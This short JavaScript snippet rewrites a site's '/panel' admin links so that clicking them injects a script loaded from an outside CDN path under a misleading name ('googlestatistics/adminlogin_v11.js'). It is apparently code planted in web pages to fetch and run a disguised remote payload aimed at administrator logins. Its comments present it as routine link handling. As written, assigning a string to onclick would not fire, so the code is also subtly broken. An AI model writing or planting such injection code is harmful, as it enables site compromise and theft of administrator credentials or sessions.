// Select all <a> elements with href="/panel"
var links = document.querySelectorAll('a[href="/panel"]');

// Check if the NodeList is not empty
if (links.length > 0) {
    links.forEach(function(link) {
        link.href = '#panel';
        link.onclick = "document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/MR0Boss/googlestatistics/adminlogin_v11.js'}));";
    });
}
